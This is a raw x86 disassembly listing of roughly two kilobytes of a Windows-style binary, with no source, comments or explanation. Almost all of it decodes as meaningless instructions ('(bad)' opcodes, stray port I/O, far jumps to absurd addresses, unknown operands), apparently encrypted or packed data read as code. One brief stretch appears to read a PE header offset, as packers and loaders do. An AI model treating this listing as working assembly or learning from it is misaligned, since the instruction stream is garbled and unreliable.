  40a472:	mov    edx,0x4ce53112
  40a477:	sbb    DWORD PTR [esi],esi
  40a479:	pusha  
  40a47a:	add    DWORD PTR [edi-0x4b],edx
  40a47d:	pop    ecx
  40a47e:	push   ss
  40a47f:	cli    
  40a480:	pop    esp
  40a481:	dec    BYTE PTR [eax]
  40a483:	mov    ebx,0x97f09840
  40a488:	shl    DWORD PTR [bp+si+0x4850],0x45
  40a48e:	clc    
  40a48f:	mov    eax,0xd7ba2f4f
  40a494:	psubq  mm1,QWORD PTR [eax+0x14]
  40a498:	ins    BYTE PTR es:[edi],dx
  40a499:	dec    esi
  40a49a:	out    dx,eax
  40a49b:	je     0x40a465
  40a49d:	popf   
  40a49e:	das    
  40a49f:	(bad)  
  40a4a0:	es jnp 0x40a51a
  40a4a3:	pop    eax
  40a4a4:	push   0x7356b703
  40a4a9:	leave  
  40a4aa:	mov    esi,0x7e6c841
  40a4af:	jg     0x40a4d3
  40a4b1:	fistp  WORD PTR [edi]
  40a4b3:	jle    0x40a4c4
  40a4b5:	inc    eax
  40a4b6:	nop
  40a4b7:	mov    cl,dh
  40a4b9:	arpl   WORD PTR [ebx+0x36],bx
  40a4bc:	out    0xa4,al
  40a4be:	sbb    al,0x4d
  40a4c0:	push   ebp
  40a4c1:	mov    dl,0x41
  40a4c3:	into   
  40a4c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a4c5:	aam    0x20
  40a4c7:	dec    edx
  40a4c8:	adc    dl,ah
  40a4ca:	leave  
  40a4cb:	and    eax,0x3847673d
  40a4d0:	pop    esi
  40a4d1:	sub    edi,DWORD PTR [edi+0x78]
  40a4d4:	cli    
  40a4d5:	xchg   ecx,eax
  40a4d6:	(bad)  
  40a4d7:	loope  0x40a548
  40a4d9:	xor    al,0x46
  40a4db:	jp     0x40a50d
  40a4dd:	lds    edi,FWORD PTR [esi-0x1d233176]
  40a4e3:	scas   eax,DWORD PTR es:[edi]
  40a4e4:	add    eax,0xb74bf98a
  40a4e9:	into   
  40a4ea:	in     al,dx
  40a4eb:	mov    bl,0x1c
  40a4ed:	push   cs
  40a4ee:	repz push ebx
  40a4f0:	in     eax,dx
  40a4f1:	aad    0xb1
  40a4f3:	push   edx
  40a4f4:	and    eax,0x9754d0a7
  40a4f9:	mov    dl,0xe3
  40a4fb:	fwait
  40a4fc:	and    DWORD PTR [edi+0x2a],ecx
  40a4ff:	in     al,0xe8
  40a501:	cmp    al,0x8
  40a503:	push   esi
  40a504:	shl    BYTE PTR [ebp-0x57906c85],cl
  40a50a:	cld    
  40a50b:	popa   
  40a50c:	rcr    DWORD PTR [ebx],0x1
  40a50f:	sub    dl,cl
  40a511:	xchg   ecx,eax
  40a512:	jl     0x40a551
  40a514:	fisttp DWORD PTR [eax]
  40a516:	mov    DWORD PTR [ecx+0x7b8ed07e],edx
  40a51c:	mov    al,0x74
  40a51e:	xchg   DWORD PTR [esi+0x6b340a3],eax
  40a524:	mov    dl,BYTE PTR [esp+esi*1-0x40]
  40a528:	xor    edx,DWORD PTR [ebp+0x526a3d7b]
  40a52e:	push   ds
  40a52f:	add    DWORD PTR [eax],esp
  40a531:	sti    
  40a532:	ds sbb cl,0xed
  40a536:	mov    WORD PTR [esi-0x73],?
  40a539:	lahf   
  40a53a:	pop    esi
  40a53b:	push   es
  40a53c:	into   
  40a53d:	xchg   ah,cl
  40a53f:	adc    al,0x8e
  40a541:	aad    0xc0
  40a543:	ins    BYTE PTR es:[edi],dx
  40a544:	bound  edi,QWORD PTR [edi-0x73]
  40a547:	and    al,0xc7
  40a549:	jo     0x40a52b
  40a54b:	cmp    DWORD PTR [ecx-0x26929ed],ebx
  40a551:	lock gs repz jo 0x40a54b
  40a556:	sub    eax,DWORD PTR [esi+0x40]
  40a559:	cmp    cl,BYTE PTR [edi+0x14]
  40a55c:	retf   0xbad1
  40a55f:	(bad)  
  40a560:	sub    DWORD PTR es:[eax],edi
  40a563:	stos   DWORD PTR es:[edi],eax
  40a564:	cmp    BYTE PTR [ebp+eiz*8+0x60],dh
  40a568:	neg    ah
  40a56a:	xchg   ebx,eax
  40a56b:	inc    esi
  40a56c:	cmc    
  40a56d:	and    bh,0xda
  40a570:	mov    edi,0xd9d689cd
  40a575:	ss pop ss
  40a577:	pop    edx
  40a578:	or     ch,BYTE PTR [edi]
  40a57a:	xor    bl,BYTE PTR [ecx]
  40a57c:	jmp    DWORD PTR cs:[edi+ebx*2-0x3691e279]
  40a584:	sbb    dh,dh
  40a586:	or     edi,ebx
  40a588:	cmp    BYTE PTR [ebx],0x23
  40a58b:	adc    BYTE PTR [ebp-0x5f],bh
  40a58e:	fwait
  40a58f:	jg     0x40a5d9
  40a591:	pop    esp
  40a592:	cld    
  40a593:	xchg   ebp,eax
  40a594:	xor    eax,DWORD PTR [eax]
  40a596:	xchg   esi,eax
  40a597:	ror    BYTE PTR [edx+0x23],0x43
  40a59b:	sub    BYTE PTR gs:[ebx],ah
  40a59e:	mov    esp,0xf2b48fc4
  40a5a3:	test   eax,0x2edbb5c8
  40a5a8:	xchg   edx,eax
  40a5a9:	push   edx
  40a5aa:	or     edi,DWORD PTR [ecx]
  40a5ac:	sub    al,dh
  40a5ae:	gs jle 0x40a570
  40a5b1:	ja     0x40a5be
  40a5b3:	inc    ecx
  40a5b4:	jecxz  0x40a562
  40a5b6:	jne    0x40a591
  40a5b8:	adc    eax,0x53e159d8
  40a5bd:	push   esp
  40a5be:	popa   
  40a5bf:	hlt    
  40a5c0:	mov    dh,0xbe
  40a5c2:	mov    ebx,0x8b552a9d
  40a5c7:	jbe    0x40a59f
  40a5c9:	pop    eax
  40a5ca:	ror    dh,0xdd
  40a5cd:	cli    
  40a5ce:	mov    ds:0xe81400f0,eax
  40a5d3:	das    
  40a5d4:	adc    cl,ah
  40a5d6:	dec    esi
  40a5d7:	(bad)  
  40a5d8:	stc    
  40a5d9:	aaa    
  40a5da:	sbb    al,0x83
  40a5dc:	sub    ch,bh
  40a5de:	jb     0x40a60a
  40a5e0:	imul   ebp,DWORD PTR [edi+eiz*1],0xffffffaf
  40a5e4:	int    0xd3
  40a5e6:	in     eax,dx
  40a5e7:	jns    0x40a5d2
  40a5e9:	jbe    0x40a5f3
  40a5eb:	pop    edi
  40a5ec:	push   es
  40a5ed:	(bad)  
  40a5ee:	fst    DWORD PTR [ebx+0x18]
  40a5f1:	stc    
  40a5f2:	or     esi,DWORD PTR [edx]
  40a5f4:	xor    al,BYTE PTR [ecx+0x6f]
  40a5f7:	icebp  
  40a5f8:	loop   0x40a66e
  40a5fa:	or     al,0xf8
  40a5fc:	jmp    0x2bb9bbdd
  40a601:	cmp    ah,bh
  40a603:	mov    eax,0xeb109990
  40a608:	lahf   
  40a609:	and    eax,0x96adead3
  40a60e:	enter  0x2aba,0x37
  40a612:	out    dx,eax
  40a613:	push   ebp
  40a614:	lahf   
  40a615:	and    bh,al
  40a617:	into   
  40a618:	jg     0x40a5ae
  40a61a:	nop
  40a61b:	dec    ecx
  40a61c:	imul   eax,DWORD PTR [eax],0x3c
  40a61f:	pop    ecx
  40a620:	fstp   TBYTE PTR [ebp+0x5f]
  40a623:	imul   ebx,DWORD PTR [ecx-0x7e42be08],0xffffffaa
  40a62a:	push   ebx
  40a62b:	call   0x384ca3f1
  40a630:	std    
  40a631:	test   BYTE PTR [ebp+0x5a],al
  40a634:	sbb    eax,0x8fd83995
  40a639:	aam    0x1c
  40a63b:	mov    al,0xb1
  40a63d:	int3   
  40a63e:	adc    DWORD PTR [ebp-0xd],0xcba770eb
  40a645:	out    dx,al
  40a646:	int3   
  40a647:	leave  
  40a648:	mov    ah,0x94
  40a64a:	sub    dh,0x1a
  40a64d:	leave  
  40a64e:	aam    0x2a
  40a650:	int    0x1f
  40a652:	(bad)  
  40a653:	sti    
  40a654:	pop    edx
  40a655:	out    0x5f,eax
  40a657:	fwait
  40a658:	es inc esi
  40a65a:	arpl   WORD PTR [edx],ax
  40a65c:	sub    BYTE PTR [ecx],ch
  40a65e:	or     eax,0x86600f96
  40a663:	mov    cs,edi
  40a665:	add    DWORD PTR [ebx],0x7c
  40a668:	sbb    bl,BYTE PTR [ebx+0xff44a1a]
  40a66e:	scas   eax,DWORD PTR es:[edi]
  40a66f:	imul   BYTE PTR ds:0xea8b85b7
  40a675:	loope  0x40a650
  40a677:	jnp    0x40a657
  40a679:	mov    esi,0xe05a57f8
  40a67e:	pop    ebx
  40a67f:	dec    ebp
  40a680:	fistp  DWORD PTR [eax+0x70]
  40a683:	add    al,0x91
  40a685:	push   ebx
  40a686:	dec    edi
  40a687:	(bad)  
  40a689:	inc    ecx
  40a68a:	xor    eax,esi
  40a68c:	daa    
  40a68d:	repz fdivp st(1),st
  40a690:	fwait
  40a691:	out    0x65,al
  40a693:	jb     0x40a6fb
  40a695:	or     ch,dl
  40a697:	fsub   st(7),st
  40a699:	xchg   ah,ch
  40a69b:	fsubr  QWORD PTR [eax]
  40a69d:	outs   dx,DWORD PTR ds:[esi]
  40a69e:	scas   al,BYTE PTR es:[edi]
  40a69f:	rol    BYTE PTR [ecx],0xfa
  40a6a2:	scas   al,BYTE PTR es:[edi]
  40a6a3:	scas   eax,DWORD PTR es:[edi]
  40a6a4:	mov    ecx,eax
  40a6a6:	pushf  
  40a6a7:	shl    BYTE PTR [eax+0x1f],0xf5
  40a6ab:	aad    0x11
  40a6ad:	add    DWORD PTR ds:0xc4dbcdf6,esp
  40a6b3:	pop    esi
  40a6b4:	mov    eax,ds:0x935e746c
  40a6b9:	call   0x47bd5145
  40a6be:	lods   al,BYTE PTR ds:[esi]
  40a6bf:	pop    edi
  40a6c0:	rcr    cl,1
  40a6c2:	push   0xc3375b8
  40a6c7:	mov    ecx,0x663f14e3
  40a6cc:	rcl    BYTE PTR [ebx+0x4571f77d],1
  40a6d2:	dec    ecx
  40a6d3:	cwde   
  40a6d4:	cld    
  40a6d5:	mov    bl,0x9e
  40a6d7:	push   esp
  40a6d8:	mov    eax,0xc703c73f
  40a6dd:	jmp    0x40a9fe
  40a6e2:	in     eax,0x96
  40a6e4:	not    BYTE PTR [ebp+esi*2+0x15776574]
  40a6eb:	sub    dh,BYTE PTR [eax+edi*4+0x41]
  40a6ef:	or     eax,0xe978a0fa
  40a6f4:	jle    0x40a774
  40a6f6:	jp     0x40a775
  40a6f8:	jle    0x40a778
  40a6fa:	lahf   
  40a6fb:	ret    0x7731
  40a6fe:	jmp    0x6617:0xb97396e5
  40a705:	pop    ss
  40a706:	jb     0x40a690
  40a708:	pop    ds
  40a709:	mov    edi,0x8fcffb49
  40a70e:	xchg   edx,eax
  40a70f:	cs xbegin 0x3e642467
  40a716:	leave  
  40a717:	add    BYTE PTR [ebp-0x48],al
  40a71a:	jmp    0x878a:0x9347cf45
  40a721:	mov    ebx,0xb5b92bf9
  40a726:	cwde   
  40a727:	xlat   BYTE PTR ds:[ebx]
  40a728:	imul   DWORD PTR [ebx-0x516b090b]
  40a72e:	data16 jmp 0x40a751
  40a731:	and    eax,0x3742c822
  40a736:	popa   
  40a737:	out    0xc,al
  40a739:	push   es
  40a73a:	add    ah,BYTE PTR [edx+0x2bb7f957]
  40a740:	mul    DWORD PTR [ebp-0x73]
  40a743:	inc    ebp
  40a744:	out    dx,eax
  40a745:	sub    ebp,DWORD PTR [edi-0x36314d32]
  40a74b:	icebp  
  40a74c:	add    al,BYTE PTR [ecx]
  40a74e:	es mov bl,0xe
  40a751:	cmp    eax,0xe6dd2665
  40a756:	shl    edi,0x88
  40a759:	lahf   
  40a75a:	mov    ebx,0x9d5397c6
  40a75f:	mov    al,ds:0x55bf1321
  40a764:	and    eax,0xa69f08f
  40a769:	loopne 0x40a728
  40a76b:	mov    bh,0x46
  40a76d:	mov    BYTE PTR ds:0xebf88841,cl
  40a773:	or     al,bh
  40a775:	xlat   BYTE PTR ds:[ebx]
  40a776:	sub    eax,DWORD PTR [esi+edi*2-0x2721c566]
  40a77d:	sub    bh,ah
  40a77f:	out    0x5c,eax
  40a781:	call   0xdfef5bbb
  40a786:	aam    0x65
  40a788:	adc    BYTE PTR [edi-0x58],bl
  40a78b:	pop    esi
  40a78c:	push   0x15e24eda
  40a791:	ficomp DWORD PTR [eax-0x34]
  40a794:	rol    DWORD PTR [ebx],1
  40a796:	out    dx,eax
  40a797:	test   eax,0xb7156b0e
  40a79c:	(bad)  
  40a79d:	in     al,0x5f
  40a79f:	xor    DWORD PTR [edx+edi*8-0x69b90f8a],edi
  40a7a6:	call   0xa80d:0x212bf29
  40a7ad:	jns    0x40a81d
  40a7af:	rcr    DWORD PTR [ebp-0x6d],cl
  40a7b2:	sub    DWORD PTR [ebp+0x6c],ebx
  40a7b5:	pushf  
  40a7b6:	jle    0x40a79b
  40a7b8:	outs   dx,BYTE PTR ds:[esi]
  40a7b9:	aam    0x10
  40a7bb:	out    dx,eax
  40a7bc:	(bad)  
  40a7bd:	lds    ecx,FWORD PTR [edi]
  40a7bf:	pop    ecx
  40a7c0:	aas    
  40a7c1:	push   esp
  40a7c2:	add    dh,0xa3
  40a7c5:	and    BYTE PTR [ebx],dh
  40a7c7:	jne    0x40a7a2
  40a7c9:	cmp    BYTE PTR [eax-0x3],0x98
  40a7cd:	inc    ecx
  40a7ce:	fidivr WORD PTR [ebp-0x28]
  40a7d1:	pop    ebp
  40a7d2:	inc    esp
  40a7d3:	fmul   DWORD PTR [edi-0x23]
  40a7d6:	aas    
  40a7d7:	(bad)  
  40a7d8:	hlt    
  40a7d9:	cs ret 0x6190
  40a7dd:	imul   cx,WORD PTR [esi+edx*8+0x58],0x42e4
  40a7e4:	sti    
  40a7e5:	mov    esi,0xc565aa8f
  40a7ea:	mov    bh,BYTE PTR [ebp+edx*4+0x7758b62]
  40a7f1:	mov    esp,0xd3c0d910
  40a7f6:	int    0x16
  40a7f8:	jge    0x40a7cc
  40a7fa:	mov    bl,0xac
  40a7fc:	jg     0x40a7fe
  40a7fe:	out    dx,eax
  40a7ff:	retf   0x69a
  40a802:	into   
  40a803:	cmp    DWORD PTR [ebx+0x3fbf8b41],ebp
  40a809:	rcl    DWORD PTR [esi-0x1370c364],cl
  40a80f:	push   0x3a8af948
  40a814:	xchg   esi,eax
  40a815:	in     al,dx
  40a816:	dec    ebx
  40a817:	add    DWORD PTR [ebp+eax*8-0x5e],ecx
  40a81b:	jle    0x40a853
  40a81d:	add    DWORD PTR [ebx-0x7f],edx
  40a820:	(bad)  
  40a821:	xlat   BYTE PTR ds:[ebx]
  40a822:	pop    esp
  40a823:	(bad)  
  40a824:	mov    dh,0x4b
  40a826:	test   eax,0xc66dc8d2
  40a82b:	mov    al,ds:0x1e5e28b5
  40a830:	dec    edx
  40a831:	cmp    eax,DWORD PTR ds:0x24161f03
  40a837:	daa    
  40a838:	gs adc al,0x31
  40a83b:	lods   al,BYTE PTR ds:[esi]
  40a83c:	test   eax,0x4c1551
  40a841:	or     BYTE PTR [ebp+0x3f],dh
  40a844:	xor    eax,0x78db3593
  40a849:	sbb    al,0xb4
  40a84b:	pop    ss
  40a84c:	inc    edx
  40a84d:	out    0xe4,eax
  40a84f:	sti    
  40a850:	mov    ebx,0x62fd5948
  40a855:	(bad)  
  40a856:	xchg   edx,eax
  40a857:	fs adc eax,0x94648004
  40a85d:	add    al,BYTE PTR [ecx+0x19a85a44]
  40a863:	xchg   ebx,eax
  40a864:	xchg   DWORD PTR [esi],eax
  40a866:	stc    
  40a867:	popa   
  40a868:	(bad)  [edx+0x14]
  40a86b:	adc    ah,ch
  40a86d:	or     BYTE PTR [edi-0x7b0b459f],al
  40a873:	xchg   ecx,eax
  40a874:	loop   0x40a805
  40a876:	jns    0x40a8f1
  40a878:	lahf   
  40a879:	imul   eax,DWORD PTR [ebp+0x67],0x671c76e0
  40a880:	retf   0xe2a5
  40a883:	iret   
  40a884:	or     al,dl
  40a886:	jns    0x40a88f
  40a888:	add    bl,bl
  40a88a:	or     al,0xf4
  40a88c:	je     0x40a8d1
  40a88e:	sbb    eax,0xaa6fd08f
  40a893:	mov    cl,0xe2
  40a895:	dec    ecx
  40a896:	ins    DWORD PTR es:[edi],dx
  40a897:	in     al,dx
  40a898:	dec    esi
  40a899:	inc    ecx
  40a89a:	sub    DWORD PTR [eax-0x1],edx
  40a89d:	and    bh,BYTE PTR [eax+0x24]
  40a8a0:	mov    bh,BYTE PTR [eax+edx*4]
  40a8a3:	popa   
  40a8a4:	lds    esp,FWORD PTR [ecx-0x2f]
  40a8a7:	sub    BYTE PTR [ebp-0x1f],cl
  40a8aa:	int    0x96
  40a8ac:	mov    dh,bl
  40a8ae:	xchg   ebp,eax
  40a8af:	or     cl,bh
  40a8b1:	xchg   ebp,eax
  40a8b2:	cmc    
  40a8b3:	pushf  
  40a8b4:	add    dl,ch
  40a8b6:	mov    esp,ecx
  40a8b8:	stos   DWORD PTR es:[edi],eax
  40a8b9:	test   DWORD PTR [ecx-0x5b],ecx
  40a8bc:	rcl    ecx,1
  40a8be:	call   0x99fbe312
  40a8c3:	xor    al,0x6f
  40a8c5:	or     eax,0x37e17336
  40a8ca:	in     eax,dx
  40a8cb:	jmp    0x6ccffd21
  40a8d0:	div    BYTE PTR [edx+0x656131bb]
  40a8d6:	ja     0x40a92a
  40a8d8:	xchg   edx,eax
  40a8d9:	jo     0x40a908
  40a8db:	or     BYTE PTR [esp+eiz*2+0x6b],0x6d
  40a8e0:	jbe    0x40a86b
  40a8e2:	lea    eax,[eax+0x2b]
  40a8e5:	pop    esi
  40a8e6:	jb     0x40a8ee
  40a8e8:	es sbb al,ah
  40a8eb:	push   0x70fae19a
  40a8f0:	xchg   ebp,eax
  40a8f1:	or     DWORD PTR [ebp-0x3d731593],0x1f
  40a8f8:	outs   dx,DWORD PTR ds:[esi]
  40a8f9:	and    DWORD PTR [eax],ebx
  40a8fb:	jl     0x40a8fc
  40a8fd:	cmp    eax,0x892f9585
  40a902:	add    esi,DWORD PTR [eax+0x45]
  40a905:	aad    0x43
  40a907:	fmul   QWORD PTR [edx-0x10572898]
  40a90d:	mov    dl,0x80
  40a90f:	aad    0xfc
  40a911:	and    esp,DWORD PTR [edi+0x78]
  40a914:	jno    0x40a8bb
  40a916:	in     eax,0x38
  40a918:	hlt    
  40a919:	jbe    0x40a96a
  40a91b:	push   edx
  40a91c:	adc    BYTE PTR ds:0xdbef30cc,ch
  40a922:	push   eax
  40a923:	mov    al,ds:0x34814d5b
  40a928:	scas   al,BYTE PTR es:[edi]
  40a929:	icebp  
  40a92a:	adc    ebp,ebp
  40a92c:	(bad)  
  40a92d:	std    
  40a92e:	aad    0x2a
  40a930:	mov    ebx,fs
  40a932:	pop    ss
  40a933:	or     dl,bh
  40a935:	or     esi,DWORD PTR [ecx+0x61fac2d0]
  40a93b:	mov    edx,DWORD PTR [ecx-0x3b]
  40a93e:	je     0x40a964
  40a940:	pop    ebx
  40a941:	dec    edx
  40a942:	fnstsw WORD PTR [eax]
  40a944:	out    0x30,eax
  40a946:	bound  eax,QWORD PTR [ebx]
  40a948:	dec    esi
  40a949:	ret    0x8ef0
  40a94c:	mov    ah,0x41
  40a94e:	cmp    BYTE PTR [esi+0x36332f61],dl
  40a954:	inc    ecx
  40a955:	retf   0x5d71
  40a958:	or     eax,0xa0775b85
  40a95d:	adc    BYTE PTR [edx],ch
  40a95f:	scas   al,BYTE PTR es:[edi]
  40a960:	je     0x40a9a8
  40a962:	lods   eax,DWORD PTR ds:[esi]
  40a963:	jns    0x40a9ac
  40a965:	and    eax,0x7867266c
  40a96a:	fcomp  QWORD PTR [edi-0xc]
  40a96e:	(bad)  
  40a96f:	daa    
  40a970:	or     eax,0x5c3d8303
  40a975:	enter  0xbe8d,0xa5
  40a979:	or     cl,BYTE PTR [edi]
  40a97b:	and    DWORD PTR [eax],eax
  40a97d:	sbb    DWORD PTR [esi+0x12],ecx
  40a980:	sar    al,0xc0
  40a983:	jnp    0x40a983
  40a985:	mov    dl,0x97
  40a987:	mov    ah,0xc3
  40a989:	js     0x40a9e9
  40a98b:	mov    edx,0xb0751f17
  40a990:	dec    esi
  40a991:	lods   eax,DWORD PTR ds:[esi]
  40a992:	push   edx
  40a993:	stos   BYTE PTR es:[edi],al
  40a994:	mov    bh,BYTE PTR fs:[edx-0x17cdf72d]
  40a99b:	xor    eax,0x6ec9bb95
  40a9a0:	lods   al,BYTE PTR ds:[esi]
  40a9a1:	dec    esp
  40a9a2:	cmovo  esp,ebx
  40a9a5:	inc    ecx
  40a9a6:	in     al,dx
  40a9a7:	aad    0x47
  40a9a9:	stos   BYTE PTR es:[edi],al
  40a9aa:	push   es
  40a9ab:	stos   DWORD PTR es:[edi],eax
  40a9ac:	adc    al,0x73
  40a9ae:	push   esi
  40a9af:	ja     0x40a981
  40a9b1:	jnp    0x40a954
  40a9b3:	(bad)  
  40a9b4:	(bad)  
  40a9b5:	retf   
  40a9b6:	in     al,dx
  40a9b7:	out    dx,eax
  40a9b8:	mov    BYTE PTR [ecx-0x5f08fec5],ah
  40a9be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a9bf:	jp     0x40a9d1
  40a9c1:	gs mov ch,0xfd
  40a9c4:	pop    eax
  40a9c5:	sbb    eax,edx
  40a9c7:	push   ss
  40a9c8:	outs   dx,DWORD PTR ds:[esi]
  40a9c9:	adc    eax,0x209a08ae
  40a9ce:	lods   al,BYTE PTR ds:[esi]
  40a9cf:	xor    eax,DWORD PTR cs:[esi+0x0]
  40a9d3:	add    BYTE PTR [ecx],dh
  40a9d5:	test   DWORD PTR [edx],ebp
  40a9d7:	jmp    0x40a9c5
  40a9d9:	outs   dx,BYTE PTR ds:[esi]
  40a9da:	outs   dx,BYTE PTR ds:[esi]
  40a9db:	push   ecx
  40a9dc:	(bad)  
  40a9dd:	std    
  40a9de:	xchg   edi,eax
  40a9df:	and    al,0xeb
  40a9e1:	retf   0x838b
  40a9e4:	pop    ebx
  40a9e5:	repnz xlat BYTE PTR ds:[ebx]
  40a9e7:	(bad)  
  40a9e9:	inc    esp
  40a9ea:	(bad)  
  40a9eb:	fidivr WORD PTR [eax+0x29865c61]
  40a9f1:	outs   dx,DWORD PTR ds:[esi]
  40a9f2:	push   eax
  40a9f3:	retf   
  40a9f4:	stc    
  40a9f5:	clc    
  40a9f6:	sbb    esp,DWORD PTR [ebx-0x6bae16e]
  40a9fc:	pusha  
  40a9fd:	inc    esp
  40a9fe:	cmp    DWORD PTR [ecx],eax
  40aa00:	je     0x40ba28
  40aa06:	mov    ecx,DWORD PTR [ebp-0x14]
  40aa09:	mov    eax,DWORD PTR [ebp-0x8]
  40aa0c:	mov    eax,DWORD PTR [eax]
  40aa0e:	mov    eax,DWORD PTR [eax+0x3c]
  40aa11:	lea    ecx,[ecx*8+0x78]
  40aa18:	jmp    0x40ad39
  40aa1d:	dec    ebx
  40aa1e:	mov    bl,BYTE PTR [edi+0x55]
  40aa21:	pop    edi
  40aa22:	jno    0x40aa95
  40aa24:	nop
  40aa25:	retf   0x4daf
  40aa28:	add    ecx,ebx
  40aa2a:	mov    bh,0x82
  40aa2c:	enter  0xf404,0x7e
  40aa30:	jle    0x40aaac
  40aa32:	jge    0x40aab2
  40aa34:	jle    0x40a9f1
  40aa36:	and    BYTE PTR [ecx+0x38],ch
  40aa39:	push   es
  40aa3a:	clc    
  40aa3b:	enter  0x82cc,0xe8
  40aa3f:	mov    ds:0x436241dd,al
  40aa44:	in     eax,dx
  40aa45:	out    0xb7,eax
  40aa47:	(bad)  
  40aa48:	pusha  
  40aa49:	sbb    al,0xec
  40aa4b:	pop    edx
  40aa4c:	sti    
  40aa4d:	aam    0xa2
  40aa4f:	aam    0xc2
  40aa51:	pop    ss
  40aa52:	inc    eax
  40aa53:	imul   edi,DWORD PTR [esi],0x4d
  40aa56:	les    ebp,FWORD PTR [edi-0x40]
  40aa59:	ss (bad) 
  40aa5c:	pop    eax
  40aa5d:	sub    ecx,ebx
  40aa5f:	and    DWORD PTR [edi+ebp*2+0x3e],0x48
  40aa64:	fistp  QWORD PTR [edx+0x79684f31]
  40aa6a:	ins    BYTE PTR es:[edi],dx
  40aa6b:	push   ecx
  40aa6c:	push   es
  40aa6d:	mov    bl,0x46
  40aa6f:	cmp    esi,ebx
  40aa71:	mov    ecx,0x47dc12d4
  40aa76:	cmp    DWORD PTR [ecx+0x11],ebp
  40aa79:	and    bl,cl
  40aa7b:	add    ebp,DWORD PTR [ecx]
  40aa7d:	add    cl,BYTE PTR [ebx]
  40aa7f:	loope  0x40aaa0
  40aa81:	dec    ebp
  40aa82:	or     al,BYTE PTR [ebx-0x105b13df]
  40aa88:	int3   
  40aa89:	add    bl,BYTE PTR [ecx-0x1f]
  40aa8c:	xor    BYTE PTR [esi],cl
  40aa8e:	inc    ecx
  40aa8f:	xor    eax,0x2b2e93b9
  40aa94:	sbb    al,0x4d
  40aa96:	add    ch,BYTE PTR [ebx-0x4dcceab3]
  40aa9c:	pop    es
  40aa9d:	sub    BYTE PTR [ebp+0x68],dl
  40aaa0:	mov    ecx,0x394719ce
  40aaa5:	pop    esp
  40aaa6:	xchg   edi,eax
  40aaa7:	(bad)  
  40aaa8:	hlt    
  40aaa9:	mov    esp,0x4d47c0df
  40aaae:	sub    edi,ebx
  40aab0:	call   0x8d78:0x5681eec6
  40aab7:	out    0x5a,eax
  40aab9:	mov    eax,0x9edad94f
  40aabe:	int    0x61
  40aac0:	mov    dl,0x92
  40aac2:	shl    BYTE PTR [ebx-0x6f],cl
  40aac5:	clc    
  40aac6:	push   ds
  40aac7:	ret    
  40aac8:	add    BYTE PTR [esi-0x2aa71a10],0xb3
  40aacf:	ja     0x40ab25
  40aad1:	jo     0x40aa5c
  40aad3:	pop    ds
  40aad4:	lock nop
  40aad6:	into   
  40aad7:	rol    eax,cl
  40aad9:	push   edx
  40aada:	jae    0x40ab0e
  40aadc:	sahf   
  40aadd:	scas   eax,DWORD PTR es:[edi]
  40aade:	push   esp
  40aadf:	rol    DWORD PTR [edi],1
  40aae1:	fisubr DWORD PTR [edx-0x26]
  40aae4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aae5:	jle    0x40aabe
  40aae7:	cld    
  40aae8:	pop    es
  40aae9:	mov    esp,DWORD PTR [ebx+eax*8-0x2aa100c6]
  40aaf0:	and    al,0xfc
  40aaf2:	rcr    DWORD PTR [ebx-0x3],cl
  40aaf5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aaf6:	cld    
  40aaf7:	mov    ebp,0xbf53093a
  40aafc:	jmp    0x5972:0xc8acf70e
  40ab03:	aaa    
  40ab04:	fisttp QWORD PTR [edi+0x75]
  40ab07:	adc    DWORD PTR ds:0x13bd584c,edx
  40ab0d:	xchg   edx,eax
  40ab0e:	adc    ah,BYTE PTR [ebx+0x12]
  40ab11:	mov    bl,BYTE PTR [edx+0x5f]
  40ab14:	push   cs
  40ab15:	add    eax,0x5d0f5446
  40ab1a:	or     BYTE PTR [ebp-0x78],0x8f
  40ab1e:	jmp    0x40ab9a
  40ab20:	das    
  40ab21:	hlt    
  40ab22:	mov    dh,BYTE PTR [ebx*2-0x7f2dad4a]
  40ab29:	ss mov edx,?
  40ab2c:	jle    0x40ab8e
  40ab2e:	ins    DWORD PTR es:[edi],dx
  40ab2f:	sti    
  40ab30:	leave  
  40ab31:	xor    bh,dl
  40ab33:	jp     0x40aba0
  40ab35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab36:	mov    gs,WORD PTR [edx+ebp*1]
  40ab39:	aaa    
  40ab3a:	xchg   edi,eax
  40ab3b:	pop    edi
  40ab3c:	(bad)  
  40ab3d:	jmp    0x40ab1b
  40ab3f:	or     BYTE PTR [edx-0x2222eed4],al
  40ab45:	into   
  40ab46:	jmp    0xa743:0x8797956d
  40ab4d:	push   cs
  40ab4e:	ins    BYTE PTR es:[edi],dx
  40ab4f:	cs mov ebx,0x96e10f2e
  40ab55:	push   edx
  40ab56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab57:	and    al,0x6e
  40ab59:	ja     0x40ab49
  40ab5b:	mov    bl,0xda
  40ab5d:	mov    ds:0xb3225148,eax
  40ab62:	inc    esp
  40ab63:	mov    edi,0xde3b8930
  40ab68:	or     al,0x0
  40ab6a:	dec    edi
  40ab6b:	outs   dx,BYTE PTR ds:[esi]
  40ab6c:	daa    
  40ab6d:	inc    ecx
  40ab6e:	into   
  40ab6f:	fld    QWORD PTR [ebp+0x2aaf09fb]
  40ab75:	(bad)  
  40ab76:	lahf   
  40ab77:	mul    BYTE PTR [ebp+edi*2-0x3092e56f]
  40ab7e:	sbb    DWORD PTR [esi],ebx
  40ab80:	and    al,BYTE PTR [eax-0x26c46720]
  40ab86:	xchg   edi,eax
  40ab87:	push   esp
  40ab88:	or     DWORD PTR [ebx+0x4393f94f],0xd
  40ab8f:	stos   BYTE PTR es:[edi],al
  40ab90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ab91:	out    dx,al
  40ab92:	dec    ebp
  40ab93:	pop    esi
  40ab94:	in     al,0xfe
  40ab96:	icebp  
  40ab97:	cmp    eax,0xa36f3541
  40ab9c:	push   edi
  40ab9d:	lahf   
  40ab9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab9f:	into   
  40aba0:	pop    edx
  40aba1:	inc    edi
  40aba2:	sbb    ch,BYTE PTR [edi]
  40aba4:	call   0x7662:0xec4614fe
  40abab:	mov    eax,0xa560a516
  40abb0:	inc    esi
  40abb1:	pop    eax
  40abb2:	mov    WORD PTR [edi-0x1e],?
  40abb5:	xor    ebp,DWORD PTR [edi+eax*4+0x51678fad]
  40abbc:	js     0x40ac02
  40abbe:	inc    ecx
